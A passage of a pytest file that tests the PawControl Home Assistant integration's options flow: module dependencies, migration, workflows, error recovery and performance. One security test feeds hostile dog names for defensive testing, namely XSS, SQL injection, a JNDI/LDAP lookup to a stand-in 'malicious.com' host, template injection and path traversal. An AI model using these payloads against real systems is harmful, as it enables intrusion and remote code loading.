"""Comprehensive validation tests for PawControl options flow advanced scenarios.

This module provides comprehensive validation testing for advanced configuration
scenarios including complex workflows, data integrity validation, cross-module
dependencies, configuration migration, security validation, and error recovery.

Test Focus Areas:
- Advanced configuration validation and data integrity
- Cross-module dependencies and validation
- Configuration migration and upgrade scenarios
- Security validation and input sanitization
- Complex multi-step workflows and state consistency
- Advanced error recovery and rollback mechanisms
- Performance validation under complex configurations
- Configuration consistency across entity profiles

Quality Scale: Platinum
Home Assistant: 2025.9.0+
Python: 3.13+
"""

from __future__ import annotations

import asyncio
import copy
import json
import time
from typing import Any, Dict, List
from unittest.mock import AsyncMock, MagicMock, Mock, call, patch

import pytest
import voluptuous as vol
from custom_components.pawcontrol.const import (
    CONF_DASHBOARD_MODE,
    CONF_DOG_AGE,
    CONF_DOG_BREED,
    CONF_DOG_ID,
    CONF_DOG_NAME,
    CONF_DOG_SIZE,
    CONF_DOG_WEIGHT,
    CONF_DOGS,
    CONF_GPS_ACCURACY_FILTER,
    CONF_GPS_DISTANCE_FILTER,
    CONF_GPS_UPDATE_INTERVAL,
    CONF_NOTIFICATIONS,
    CONF_QUIET_END,
    CONF_QUIET_HOURS,
    CONF_QUIET_START,
    CONF_REMINDER_REPEAT_MIN,
    CONF_RESET_TIME,
    DEFAULT_GPS_ACCURACY_FILTER,
    DEFAULT_GPS_DISTANCE_FILTER,
    DEFAULT_GPS_UPDATE_INTERVAL,
    DEFAULT_REMINDER_REPEAT_MIN,
    DEFAULT_RESET_TIME,
    MODULE_FEEDING,
    MODULE_GPS,
    MODULE_HEALTH,
    MODULE_WALK,
)
from custom_components.pawcontrol.entity_factory import ENTITY_PROFILES, EntityFactory
from custom_components.pawcontrol.options_flow import PawControlOptionsFlow
from homeassistant.config_entries import ConfigEntry, ConfigFlowResult
from homeassistant.core import HomeAssistant
from homeassistant.data_entry_flow import FlowResultType


@pytest.fixture
def complex_config_entry():
    """Create a complex config entry for advanced testing."""
    entry = MagicMock(spec=ConfigEntry)
    entry.entry_id = "advanced_test_entry"
    entry.data = {
        CONF_DOGS: [
            {
                CONF_DOG_ID: "advanced_dog_1",
                CONF_DOG_NAME: "Advanced Test Dog 1",
                CONF_DOG_SIZE: "large",
                CONF_DOG_WEIGHT: 45.0,
                CONF_DOG_AGE: 5,
                CONF_DOG_BREED: "German Shepherd",
                "modules": {
                    MODULE_FEEDING: True,
                    MODULE_GPS: True,
                    MODULE_HEALTH: True,
                    MODULE_WALK: True,
                    "notifications": True,
                    "dashboard": True,
                    "visitor": True,
                    "grooming": True,
                    "medication": True,
                    "training": True,
                },
                "feeding_config": {
                    "meals_per_day": 3,
                    "food_types": ["dry_food", "wet_food", "treats"],
                    "special_diet": True,
                    "allergies": ["chicken", "beef"],
                },
                "health_config": {
                    "medications": [
                        {
                            "name": "Medication A",
                            "dosage": "10mg",
                            "frequency": "daily",
                        },
                        {
                            "name": "Medication B",
                            "dosage": "5ml",
                            "frequency": "weekly",
                        },
                    ],
                    "vaccinations": [
                        {
                            "name": "Rabies",
                            "last_date": "2024-01-15",
                            "next_due": "2025-01-15",
                        },
                        {
                            "name": "DHPP",
                            "last_date": "2024-03-20",
                            "next_due": "2025-03-20",
                        },
                    ],
                },
                "gps_config": {
                    "device_id": "gps_tracker_001",
                    "geofences": [
                        {"name": "Home", "lat": 51.5074, "lon": -0.1278, "radius": 100},
                        {"name": "Park", "lat": 51.5080, "lon": -0.1290, "radius": 50},
                    ],
                },
            },
            {
                CONF_DOG_ID: "advanced_dog_2",
                CONF_DOG_NAME: "Advanced Test Dog 2",
                CONF_DOG_SIZE: "small",
                CONF_DOG_WEIGHT: 8.5,
                CONF_DOG_AGE: 2,
                CONF_DOG_BREED: "Yorkshire Terrier",
                "modules": {
                    MODULE_FEEDING: True,
                    MODULE_GPS: False,
                    MODULE_HEALTH: True,
                    MODULE_WALK: False,
                    "notifications": False,
                    "dashboard": True,
                    "visitor": False,
                    "grooming": True,
                    "medication": False,
                    "training": True,
                },
                "feeding_config": {
                    "meals_per_day": 4,
                    "food_types": ["small_breed_dry"],
                    "special_diet": False,
                    "allergies": [],
                },
            },
        ]
    }
    entry.options = {
        "entity_profile": "advanced",
        "performance_mode": "full",
        "batch_size": 25,
        "cache_ttl": 600,
        "selective_refresh": True,
        CONF_GPS_UPDATE_INTERVAL: 45,
        CONF_GPS_ACCURACY_FILTER: 25,
        CONF_GPS_DISTANCE_FILTER: 5,
        CONF_NOTIFICATIONS: {
            CONF_QUIET_HOURS: True,
            CONF_QUIET_START: "23:00:00",
            CONF_QUIET_END: "06:00:00",
            CONF_REMINDER_REPEAT_MIN: 15,
            "priority_notifications": True,
            "mobile_notifications": True,
        },
        "feeding_settings": {
            "default_meals_per_day": 2,
            "feeding_reminders": True,
            "portion_tracking": True,
            "calorie_tracking": True,
            "auto_schedule": True,
        },
        "health_settings": {
            "weight_tracking": True,
            "medication_reminders": True,
            "vet_reminders": True,
            "grooming_reminders": True,
            "health_alerts": True,
        },
        "system_settings": {
            "data_retention_days": 365,
            "auto_backup": True,
            "performance_mode": "full",
        },
        CONF_DASHBOARD_MODE: "full",
        "dashboard_settings": {
            "show_statistics": True,
            "show_alerts": True,
            "compact_mode": False,
            "show_maps": True,
        },
        "advanced_settings": {
            "debug_logging": True,
            "experimental_features": True,
        },
    }
    return entry


@pytest.fixture
def mock_hass_advanced():
    """Create a mock Home Assistant instance for advanced testing."""
    hass = MagicMock(spec=HomeAssistant)
    hass.config_entries = MagicMock()
    hass.config_entries.async_update_entry = AsyncMock()
    hass.config_entries.async_reload = AsyncMock()

    # Mock state for validation tests
    hass.states = MagicMock()
    hass.states.get = MagicMock(return_value=None)

    # Mock entity registry
    hass.data = {"entity_registry": MagicMock()}

    return hass


@pytest.fixture
def advanced_options_flow(mock_hass_advanced, complex_config_entry):
    """Create an advanced options flow for testing."""
    flow = PawControlOptionsFlow(complex_config_entry)
    flow.hass = mock_hass_advanced
    return flow


class TestAdvancedConfigurationValidation:
    """Test advanced configuration validation scenarios."""

    @pytest.mark.asyncio
    async def test_cross_module_dependency_validation(self, advanced_options_flow):
        """Test validation of dependencies between modules."""
        # GPS module requires GPS config for proper functioning
        gps_dependent_config = {
            "module_gps": True,
            "module_feeding": False,
            "module_health": False,
            "module_walk": False,
        }

        # Set current dog for testing
        advanced_options_flow._current_dog = advanced_options_flow._config_entry.data[
            CONF_DOGS
        ][0]

        # Configure modules with GPS enabled
        result = await advanced_options_flow.async_step_configure_dog_modules(
            gps_dependent_config
        )

        # Should succeed and update configuration
        assert result["type"] == FlowResultType.FORM

        # Verify GPS module configuration was properly handled
        advanced_options_flow.hass.config_entries.async_update_entry.assert_called()

    @pytest.mark.asyncio
    async def test_feeding_health_module_interaction_validation(
        self, advanced_options_flow
    ):
        """Test validation of feeding and health module interactions."""
        # Health module with medication requires feeding module for medication timing
        health_feeding_config = {
            "module_feeding": True,
            "module_health": True,
            "module_medication": True,
            "module_notifications": True,  # Required for medication reminders
        }

        advanced_options_flow._current_dog = advanced_options_flow._config_entry.data[
            CONF_DOGS
        ][0]

        result = await advanced_options_flow.async_step_configure_dog_modules(
            health_feeding_config
        )

        # Should succeed with proper module combination
        assert result["type"] == FlowResultType.FORM
        advanced_options_flow.hass.config_entries.async_update_entry.assert_called()

    @pytest.mark.asyncio
    async def test_entity_profile_performance_consistency_validation(
        self, advanced_options_flow
    ):
        """Test consistency validation between entity profiles and performance settings."""
        # Test conflicting settings: basic profile with full performance mode
        conflicting_settings = {
            "entity_profile": "basic",
            "performance_mode": "full",
            "batch_size": 50,  # High batch size with basic profile
            "cache_ttl": 3600,  # Long cache with basic profile
        }

        result = await advanced_options_flow.async_step_performance_settings(
            conflicting_settings
        )

        # Should accept but warn about potential conflicts
        assert result["type"] == FlowResultType.CREATE_ENTRY
        assert result["data"]["entity_profile"] == "basic"
        assert result["data"]["performance_mode"] == "full"

    @pytest.mark.asyncio
    async def test_gps_accuracy_distance_relationship_validation(
        self, advanced_options_flow
    ):
        """Test validation of GPS accuracy and distance filter relationships."""
        # Distance filter should be reasonable relative to accuracy filter
        gps_configs = [
            {"gps_accuracy_filter": 5, "gps_distance_filter": 1},  # Good ratio
            {
                "gps_accuracy_filter": 100,
                "gps_distance_filter": 50,
            },  # Questionable ratio
            {"gps_accuracy_filter": 500, "gps_distance_filter": 100},  # Poor ratio
        ]

        for config in gps_configs:
            result = await advanced_options_flow.async_step_gps_settings(config)

            # All should be accepted (validation is informational)
            assert result["type"] == FlowResultType.CREATE_ENTRY
            assert CONF_GPS_ACCURACY_FILTER in result["data"]
            assert CONF_GPS_DISTANCE_FILTER in result["data"]

    @pytest.mark.asyncio
    async def test_notification_quiet_hours_validation(self, advanced_options_flow):
        """Test validation of notification quiet hours logic."""
        # Test edge cases for quiet hours
        quiet_hour_configs = [
            {"quiet_start": "22:00:00", "quiet_end": "06:00:00"},  # Normal overnight
            {"quiet_start": "23:59:59", "quiet_end": "00:00:01"},  # Midnight crossing
            {"quiet_start": "12:00:00", "quiet_end": "13:00:00"},  # Midday quiet
            {"quiet_start": "00:00:00", "quiet_end": "23:59:59"},  # Almost all day
        ]

        for config in quiet_hour_configs:
            config["quiet_hours"] = True
            result = await advanced_options_flow.async_step_notifications(config)

            assert result["type"] == FlowResultType.CREATE_ENTRY
            assert CONF_NOTIFICATIONS in result["data"]

    def test_dog_weight_size_consistency_validation(self, advanced_options_flow):
        """Test validation of dog weight vs size consistency."""
        # Test weight/size combinations
        weight_size_combinations = [
            (5.0, "toy"),  # Consistent
            (45.0, "small"),  # Inconsistent (too heavy for small)
            (10.0, "giant"),  # Inconsistent (too light for giant)
            (25.0, "medium"),  # Consistent
            (80.0, "giant"),  # Consistent
        ]

        for weight, size in weight_size_combinations:
            advanced_options_flow._current_dog = {
                CONF_DOG_WEIGHT: weight,
                CONF_DOG_SIZE: size,
                CONF_DOG_NAME: "Test Dog",
                CONF_DOG_ID: "test_dog",
            }

            schema = advanced_options_flow._get_edit_dog_schema()

            # Schema should accept all combinations (validation is advisory)
            assert schema is not None

    @pytest.mark.asyncio
    async def test_data_retention_backup_consistency_validation(
        self, advanced_options_flow
    ):
        """Test validation of data retention vs backup settings consistency."""
        # Short retention with auto backup might be inefficient
        retention_backup_configs = [
            {
                "data_retention_days": 30,
                "auto_backup": True,
            },  # Short retention + backup
            {
                "data_retention_days": 365,
                "auto_backup": False,
            },  # Long retention - no backup
            {"data_retention_days": 90, "auto_backup": True},  # Balanced
        ]

        for config in retention_backup_configs:
            config["reset_time"] = "00:00:00"
            config["performance_mode"] = "balanced"

            result = await advanced_options_flow.async_step_system_settings(config)

            assert result["type"] == FlowResultType.CREATE_ENTRY


class TestConfigurationMigrationScenarios:
    """Test configuration migration and upgrade scenarios."""

    @pytest.mark.asyncio
    async def test_legacy_dog_config_migration(self, advanced_options_flow):
        """Test migration from legacy dog configuration format."""
        # Simulate legacy config without modules
        legacy_dogs = [
            {
                CONF_DOG_ID: "legacy_dog",
                CONF_DOG_NAME: "Legacy Dog",
                CONF_DOG_SIZE: "medium",
                CONF_DOG_WEIGHT: 20.0,
                CONF_DOG_AGE: 3,
                # No 'modules' key (legacy format)
            }
        ]

        advanced_options_flow._config_entry.data = {CONF_DOGS: legacy_dogs}
        advanced_options_flow._dogs = legacy_dogs.copy()

        # Accessing module configuration should handle missing modules gracefully
        result = await advanced_options_flow.async_step_select_dog_for_modules(None)

        # Should still work and show the dog
        assert result["type"] == FlowResultType.FORM

    @pytest.mark.asyncio
    async def test_entity_profile_migration(self, advanced_options_flow):
        """Test migration between entity profiles."""
        # Simulate upgrading from basic to advanced profile
        profile_transitions = [
            ("basic", "standard"),
            ("standard", "advanced"),
            ("advanced", "gps_focus"),
            ("gps_focus", "health_focus"),
        ]

        for old_profile, new_profile in profile_transitions:
            # Set current profile
            advanced_options_flow._config_entry.options = {
                **advanced_options_flow._config_entry.options,
                "entity_profile": old_profile,
            }

            # Upgrade to new profile
            result = await advanced_options_flow.async_step_entity_profiles(
                {"entity_profile": new_profile}
            )

            assert result["type"] == FlowResultType.CREATE_ENTRY
            assert result["data"]["entity_profile"] == new_profile

    @pytest.mark.asyncio
    async def test_options_schema_evolution(self, advanced_options_flow):
        """Test handling of evolved options schema."""
        # Simulate old options missing new fields
        old_options = {
            "entity_profile": "standard",
            # Missing newer fields like performance_mode, batch_size, etc.
        }

        advanced_options_flow._config_entry.options = old_options

        # Adding new performance settings should work with defaults
        new_settings = {
            "entity_profile": "standard",
            "performance_mode": "balanced",
            "batch_size": 15,
            "cache_ttl": 300,
            "selective_refresh": True,
        }

        result = await advanced_options_flow.async_step_performance_settings(
            new_settings
        )

        assert result["type"] == FlowResultType.CREATE_ENTRY
        assert all(key in result["data"] for key in new_settings)

    @pytest.mark.asyncio
    async def test_dog_module_configuration_evolution(self, advanced_options_flow):
        """Test evolution of dog module configuration."""
        # Add new modules to existing dog
        existing_dog = advanced_options_flow._config_entry.data[CONF_DOGS][0].copy()
        existing_modules = existing_dog.get("modules", {})

        # Add new modules
        new_modules = {
            **existing_modules,
            "visitor": True,
            "grooming": True,
            "medication": True,
            "training": True,
        }

        advanced_options_flow._current_dog = existing_dog

        result = await advanced_options_flow.async_step_configure_dog_modules(
            new_modules
        )

        assert result["type"] == FlowResultType.FORM
        advanced_options_flow.hass.config_entries.async_update_entry.assert_called()


class TestSecurityValidationScenarios:
    """Test security validation and input sanitization."""

    @pytest.mark.asyncio
    async def test_dog_id_sanitization(self, advanced_options_flow):
        """Test dog ID input sanitization."""
        # Test various potentially problematic dog IDs
        problematic_ids = [
            "Dog With Spaces",  # Spaces should be converted to underscores
            "dog-with-hyphens",  # Hyphens might be acceptable
            "dog.with.dots",  # Dots might cause issues
            "dog@with@symbols",  # Special characters
            "DOG_WITH_CAPS",  # Should be lowercased
            "   dog_with_whitespace   ",  # Leading/trailing whitespace
        ]

        for dog_id in problematic_ids:
            result = await advanced_options_flow.async_step_add_new_dog(
                {
                    CONF_DOG_ID: dog_id,
                    CONF_DOG_NAME: "Test Dog",
                }
            )

            # Should either succeed with sanitized ID or show form again
            assert result["type"] in [FlowResultType.FORM, FlowResultType.CREATE_ENTRY]

    @pytest.mark.asyncio
    async def test_dog_name_injection_prevention(self, advanced_options_flow):
        """Test prevention of injection attacks in dog names."""
        # Test potentially malicious dog names
        malicious_names = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE dogs; --",
            "${jndi:ldap://malicious.com/exploit}",
            "{{7*7}}",  # Template injection
            "../../../etc/passwd",  # Path traversal
        ]

        for name in malicious_names:
            result = await advanced_options_flow.async_step_add_new_dog(
                {
                    CONF_DOG_ID: "test_dog",
                    CONF_DOG_NAME: name,
                }
            )

            # Should handle gracefully (accept as literal string)
            assert result["type"] == FlowResultType.FORM

    def test_numeric_input_bounds_validation(self, advanced_options_flow):
        """Test validation of numeric input boundaries."""
        # Test extreme values for various numeric fields
        extreme_values = [
            ("dog_age", -1),  # Negative age
            ("dog_age", 1000),  # Unrealistic age
            ("dog_weight", -5.0),  # Negative weight
            ("dog_weight", 1000.0),  # Unrealistic weight
            ("gps_update_interval", 0),  # Zero interval
            ("gps_accuracy_filter", -10),  # Negative accuracy
            ("batch_size", 0),  # Zero batch size
            ("batch_size", 1000),  # Extremely large batch
        ]

        for field, value in extreme_values:
            if field.startswith("dog_"):
                schema = advanced_options_flow._get_add_dog_schema()
                test_data = {
                    CONF_DOG_ID: "test",
                    CONF_DOG_NAME: "Test",
                    field.replace("dog_", CONF_DOG_NAME.split("_")[1]): value,
                }
            elif field.startswith("gps_"):
                schema = advanced_options_flow._get_gps_settings_schema()
                test_data = {field: value}
            else:
                schema = advanced_options_flow._get_performance_settings_schema()
                test_data = {field: value}

            # Schema should reject invalid values
            with pytest.raises((vol.Invalid, ValueError)):
                schema(test_data)

    @pytest.mark.asyncio
    async def test_configuration_size_limits(self, advanced_options_flow):
        """Test configuration size limits to prevent DoS."""
        # Create extremely large configuration data
        large_dog_name = "A" * 10000  # Very long name
        large_breed = "B" * 5000  # Very long breed

        result = await advanced_options_flow.async_step_add_new_dog(
            {
                CONF_DOG_ID: "large_dog",
                CONF_DOG_NAME: large_dog_name,
                CONF_DOG_BREED: large_breed,
            }
        )

        # Should handle large inputs gracefully
        assert result["type"] == FlowResultType.FORM

    def test_time_format_validation(self, advanced_options_flow):
        """Test time format validation security."""
        # Test potentially malicious time formats
        malicious_times = [
            "25:00:00",  # Invalid hour
            "12:60:00",  # Invalid minute
            "12:30:60",  # Invalid second
            "12:30",  # Missing seconds
            "12:30:30:30",  # Too many components
            "twelve:thirty:zero",  # Non-numeric
            "",  # Empty string
        ]

        schema = advanced_options_flow._get_notifications_schema()

        for time_value in malicious_times:
            test_data = {"quiet_start": time_value}

            # Schema should reject invalid time formats
            try:
                validated = schema(test_data)
                # If validation passes, time should be properly formatted
                if "quiet_start" in validated:
                    assert isinstance(validated["quiet_start"], str)
            except (vol.Invalid, ValueError):
                # Expected for invalid formats
                pass


class TestComplexWorkflowScenarios:
    """Test complex multi-step workflow scenarios."""

    @pytest.mark.asyncio
    async def test_complete_dog_setup_workflow(self, advanced_options_flow):
        """Test complete dog setup from start to finish."""
        # Step 1: Add new dog
        new_dog_data = {
            CONF_DOG_ID: "workflow_dog",
            CONF_DOG_NAME: "Workflow Test Dog",
            CONF_DOG_BREED: "Border Collie",
            CONF_DOG_AGE: 3,
            CONF_DOG_WEIGHT: 25.0,
            CONF_DOG_SIZE: "medium",
        }

        result1 = await advanced_options_flow.async_step_add_new_dog(new_dog_data)
        assert result1["type"] == FlowResultType.FORM

        # Step 2: Configure modules for new dog
        # First select the dog
        result2 = await advanced_options_flow.async_step_select_dog_for_modules(
            {"dog_id": "workflow_dog"}
        )
        assert result2["type"] == FlowResultType.FORM

        # Configure modules
        module_config = {
            "module_feeding": True,
            "module_walk": True,
            "module_gps": True,
            "module_health": True,
            "module_notifications": True,
        }

        result3 = await advanced_options_flow.async_step_configure_dog_modules(
            module_config
        )
        assert result3["type"] == FlowResultType.FORM

        # Step 3: Configure GPS settings for the dog
        gps_config = {
            "gps_enabled": True,
            "gps_update_interval": 60,
            "gps_accuracy_filter": 20,
        }

        result4 = await advanced_options_flow.async_step_gps_settings(gps_config)
        assert result4["type"] == FlowResultType.CREATE_ENTRY

    @pytest.mark.asyncio
    async def test_multi_dog_configuration_workflow(self, advanced_options_flow):
        """Test configuring multiple dogs with different settings."""
        dogs_configs = [
            {
                "data": {
                    CONF_DOG_ID: "multi_dog_1",
                    CONF_DOG_NAME: "Multi Dog 1",
                    CONF_DOG_SIZE: "large",
                },
                "modules": {
                    "module_feeding": True,
                    "module_gps": True,
                    "module_health": False,
                },
            },
            {
                "data": {
                    CONF_DOG_ID: "multi_dog_2",
                    CONF_DOG_NAME: "Multi Dog 2",
                    CONF_DOG_SIZE: "small",
                },
                "modules": {
                    "module_feeding": False,
                    "module_gps": False,
                    "module_health": True,
                },
            },
        ]

        for dog_config in dogs_configs:
            # Add dog
            await advanced_options_flow.async_step_add_new_dog(dog_config["data"])

            # Configure modules
            await advanced_options_flow.async_step_select_dog_for_modules(
                {"dog_id": dog_config["data"][CONF_DOG_ID]}
            )
            await advanced_options_flow.async_step_configure_dog_modules(
                dog_config["modules"]
            )

        # Verify all operations completed
        advanced_options_flow.hass.config_entries.async_update_entry.assert_called()

    @pytest.mark.asyncio
    async def test_entity_profile_optimization_workflow(self, advanced_options_flow):
        """Test entity profile optimization workflow."""
        # Step 1: Preview current profile
        result1 = await advanced_options_flow.async_step_entity_profiles(
            {"entity_profile": "standard", "preview_estimate": True}
        )
        assert result1["type"] == FlowResultType.FORM
        assert result1["step_id"] == "profile_preview"

        # Step 2: Review preview and decide
        result2 = await advanced_options_flow.async_step_profile_preview(
            {"profile": "advanced", "apply_profile": False}
        )
        assert result2["type"] == FlowResultType.FORM

        # Step 3: Try different profile with preview
        result3 = await advanced_options_flow.async_step_entity_profiles(
            {"entity_profile": "advanced", "preview_estimate": True}
        )
        assert result3["type"] == FlowResultType.FORM

        # Step 4: Apply the profile
        result4 = await advanced_options_flow.async_step_profile_preview(
            {"profile": "advanced", "apply_profile": True}
        )
        assert result4["type"] == FlowResultType.CREATE_ENTRY

    @pytest.mark.asyncio
    async def test_performance_tuning_workflow(self, advanced_options_flow):
        """Test performance tuning workflow."""
        # Step 1: Set entity profile for performance
        await advanced_options_flow.async_step_entity_profiles(
            {"entity_profile": "basic"}  # Start with basic for performance
        )

        # Step 2: Configure performance settings
        performance_config = {
            "entity_profile": "basic",
            "performance_mode": "minimal",
            "batch_size": 10,
            "cache_ttl": 180,
            "selective_refresh": True,
        }

        result = await advanced_options_flow.async_step_performance_settings(
            performance_config
        )
        assert result["type"] == FlowResultType.CREATE_ENTRY

        # Step 3: Adjust system settings for performance
        system_config = {
            "reset_time": "03:00:00",  # Off-peak time
            "data_retention_days": 60,  # Shorter retention
            "auto_backup": False,  # Disable for performance
            "performance_mode": "minimal",
        }

        result2 = await advanced_options_flow.async_step_system_settings(system_config)
        assert result2["type"] == FlowResultType.CREATE_ENTRY


class TestAdvancedErrorRecoveryScenarios:
    """Test advanced error recovery and rollback mechanisms."""

    @pytest.mark.asyncio
    async def test_partial_configuration_failure_recovery(self, advanced_options_flow):
        """Test recovery from partial configuration failures."""
        # Simulate partial failure during dog configuration
        copy.deepcopy(advanced_options_flow._config_entry.data[CONF_DOGS])

        # Mock update_entry to fail after first call
        call_count = 0

        def failing_update(*args, **kwargs):
            nonlocal call_count
            call_count += 1
            if call_count == 1:
                return None  # First call succeeds
            else:
                raise Exception("Update failed")

        advanced_options_flow.hass.config_entries.async_update_entry.side_effect = (
            failing_update
        )

        # Try to add multiple dogs
        await advanced_options_flow.async_step_add_new_dog(
            {
                CONF_DOG_ID: "recovery_dog_1",
                CONF_DOG_NAME: "Recovery Dog 1",
            }
        )

        dog2_result = await advanced_options_flow.async_step_add_new_dog(
            {
                CONF_DOG_ID: "recovery_dog_2",
                CONF_DOG_NAME: "Recovery Dog 2",
            }
        )

        # Second dog should show error
        assert dog2_result["type"] == FlowResultType.FORM
        assert "errors" in dog2_result

    @pytest.mark.asyncio
    async def test_configuration_corruption_detection(self, advanced_options_flow):
        """Test detection and handling of configuration corruption."""
        # Simulate corrupted dog configuration
        corrupted_dogs = [
            {
                CONF_DOG_ID: "corrupted_dog",
                # Missing required fields like CONF_DOG_NAME
                "invalid_field": "invalid_value",
            }
        ]

        advanced_options_flow._config_entry.data = {CONF_DOGS: corrupted_dogs}
        advanced_options_flow._dogs = corrupted_dogs.copy()

        # Try to work with corrupted configuration
        result = await advanced_options_flow.async_step_manage_dogs(None)

        # Should handle corruption gracefully
        assert result["type"] == FlowResultType.FORM

    @pytest.mark.asyncio
    async def test_concurrent_modification_handling(self, advanced_options_flow):
        """Test handling of concurrent configuration modifications."""
        # Simulate config being modified externally during options flow
        original_config = copy.deepcopy(advanced_options_flow._config_entry.data)

        # Start editing a dog
        advanced_options_flow._current_dog = original_config[CONF_DOGS][0]

        # Simulate external modification of config
        modified_dogs = copy.deepcopy(original_config[CONF_DOGS])
        modified_dogs[0][CONF_DOG_NAME] = "Externally Modified Name"
        advanced_options_flow._config_entry.data = {CONF_DOGS: modified_dogs}

        # Try to save changes
        result = await advanced_options_flow.async_step_edit_dog(
            {
                CONF_DOG_NAME: "User Modified Name",
            }
        )

        # Should handle concurrent modification
        assert result["type"] == FlowResultType.FORM

    @pytest.mark.asyncio
    async def test_network_timeout_recovery(self, advanced_options_flow):
        """Test recovery from network timeouts during configuration saves."""
        # Simulate network timeout
        advanced_options_flow.hass.config_entries.async_update_entry.side_effect = (
            TimeoutError()
        )

        result = await advanced_options_flow.async_step_gps_settings(
            {
                "gps_enabled": True,
                "gps_update_interval": 60,
            }
        )

        # Should show error form for retry
        assert result["type"] == FlowResultType.FORM
        assert "errors" in result

    @pytest.mark.asyncio
    async def test_memory_pressure_handling(self, advanced_options_flow):
        """Test handling of memory pressure during large configuration operations."""
        # Create large configuration to simulate memory pressure
        large_dogs = []
        for i in range(100):
            large_dogs.append(
                {
                    CONF_DOG_ID: f"memory_dog_{i}",
                    CONF_DOG_NAME: f"Memory Dog {i}",
                    CONF_DOG_SIZE: "medium",
                    CONF_DOG_WEIGHT: 20.0 + i,
                    "large_data": "x" * 1000,  # Large data per dog
                    "modules": {
                        MODULE_FEEDING: True,
                        MODULE_GPS: True,
                        MODULE_HEALTH: True,
                    },
                }
            )

        advanced_options_flow._config_entry.data = {CONF_DOGS: large_dogs}
        advanced_options_flow._dogs = large_dogs.copy()

        # Simulate memory error
        def memory_error_update(*args, **kwargs):
            raise MemoryError("Insufficient memory")

        advanced_options_flow.hass.config_entries.async_update_entry.side_effect = (
            memory_error_update
        )

        result = await advanced_options_flow.async_step_add_new_dog(
            {
                CONF_DOG_ID: "memory_test_dog",
                CONF_DOG_NAME: "Memory Test Dog",
            }
        )

        # Should handle memory error gracefully
        assert result["type"] == FlowResultType.FORM
        assert "errors" in result


class TestPerformanceValidationScenarios:
    """Test performance validation under complex scenarios."""

    @pytest.mark.asyncio
    async def test_large_scale_entity_estimation_performance(
        self, advanced_options_flow
    ):
        """Test performance of entity estimation with large configurations."""
        # Create configuration with many dogs and complex modules
        many_dogs = []
        for i in range(50):
            many_dogs.append(
                {
                    CONF_DOG_ID: f"perf_dog_{i}",
                    CONF_DOG_NAME: f"Performance Dog {i}",
                    "modules": {
                        MODULE_FEEDING: i % 2 == 0,
                        MODULE_GPS: i % 3 == 0,
                        MODULE_HEALTH: i % 4 == 0,
                        MODULE_WALK: i % 5 == 0,
                        "notifications": True,
                        "dashboard": True,
                        "visitor": i % 6 == 0,
                        "grooming": i % 7 == 0,
                        "medication": i % 8 == 0,
                        "training": i % 9 == 0,
                    },
                }
            )

        advanced_options_flow._config_entry.data = {CONF_DOGS: many_dogs}

        # Test performance of profile description generation
        start_time = time.time()
        placeholders = advanced_options_flow._get_profile_description_placeholders()
        end_time = time.time()

        # Should complete within reasonable time
        assert end_time - start_time < 2.0
        assert "estimated_entities" in placeholders
        assert int(placeholders["estimated_entities"]) > 0

    @pytest.mark.asyncio
    async def test_rapid_configuration_changes_performance(self, advanced_options_flow):
        """Test performance under rapid configuration changes."""
        # Simulate rapid configuration changes
        config_changes = [
            ("gps_settings", {"gps_enabled": True, "gps_update_interval": 30}),
            ("notifications", {"quiet_hours": False}),
            ("feeding_settings", {"meals_per_day": 4}),
            ("health_settings", {"weight_tracking": False}),
            ("performance_settings", {"performance_mode": "full"}),
        ]

        start_time = time.time()

        # Apply all changes rapidly
        for step_name, config in config_changes:
            step_method = getattr(advanced_options_flow, f"async_step_{step_name}")
            await step_method(config)

        end_time = time.time()

        # Should handle rapid changes efficiently
        assert end_time - start_time < 5.0

    @pytest.mark.asyncio
    async def test_memory_efficient_dog_management(self, advanced_options_flow):
        """Test memory efficiency in dog management operations."""
        # Test memory usage with deep copying
        advanced_options_flow._dogs.copy()

        # Perform multiple dog operations
        operations = [
            lambda: advanced_options_flow.async_step_manage_dogs(None),
            lambda: advanced_options_flow.async_step_add_new_dog(
                {
                    CONF_DOG_ID: "memory_efficient_dog",
                    CONF_DOG_NAME: "Memory Efficient Dog",
                }
            ),
        ]

        for operation in operations:
            await operation()

            # Verify memory usage doesn't grow excessively
            current_dogs = advanced_options_flow._dogs
            assert isinstance(current_dogs, list)

    def test_schema_validation_performance(self, advanced_options_flow):
        """Test performance of schema validation with complex data."""
        # Test performance of schema validation
        schemas = [
            advanced_options_flow._get_entity_profiles_schema(),
            advanced_options_flow._get_performance_settings_schema(),
            advanced_options_flow._get_gps_settings_schema(),
            advanced_options_flow._get_notifications_schema(),
        ]

        test_data_sets = [
            {"entity_profile": "advanced", "preview_estimate": True},
            {"performance_mode": "full", "batch_size": 25},
            {"gps_enabled": True, "gps_update_interval": 45},
            {"quiet_hours": True, "quiet_start": "22:00:00"},
        ]

        start_time = time.time()

        # Validate multiple schemas rapidly
        for schema, data in zip(schemas, test_data_sets, strict=False):
            validated = schema(data)
            assert validated is not None

        end_time = time.time()

        # Schema validation should be fast
        assert end_time - start_time < 1.0


class TestConfigurationConsistencyValidation:
    """Test configuration consistency across different settings."""

    @pytest.mark.asyncio
    async def test_entity_profile_module_consistency(self, advanced_options_flow):
        """Test consistency between entity profiles and enabled modules."""
        profiles_module_tests = [
            ("basic", {MODULE_FEEDING: True, MODULE_GPS: False}),
            ("gps_focus", {MODULE_GPS: True, MODULE_FEEDING: False}),
            ("health_focus", {MODULE_HEALTH: True, MODULE_GPS: False}),
        ]

        for profile, modules in profiles_module_tests:
            # Set entity profile
            await advanced_options_flow.async_step_entity_profiles(
                {"entity_profile": profile}
            )

            # Configure dog modules to match profile focus
            advanced_options_flow._current_dog = {
                CONF_DOG_ID: "consistency_dog",
                CONF_DOG_NAME: "Consistency Dog",
                "modules": modules,
            }

            result = await advanced_options_flow.async_step_configure_dog_modules(
                modules
            )

            # Should be consistent and work well together
            assert result["type"] == FlowResultType.FORM

    @pytest.mark.asyncio
    async def test_performance_settings_consistency(self, advanced_options_flow):
        """Test consistency between different performance settings."""
        # Test performance setting combinations
        performance_combinations = [
            {
                "entity_profile": "basic",
                "performance_mode": "minimal",
                "batch_size": 5,
                "cache_ttl": 60,
            },
            {
                "entity_profile": "advanced",
                "performance_mode": "full",
                "batch_size": 50,
                "cache_ttl": 3600,
            },
        ]

        for settings in performance_combinations:
            result = await advanced_options_flow.async_step_performance_settings(
                settings
            )

            assert result["type"] == FlowResultType.CREATE_ENTRY
            # Verify all settings were applied
            for key, value in settings.items():
                assert result["data"][key] == value

    @pytest.mark.asyncio
    async def test_notification_feeding_consistency(self, advanced_options_flow):
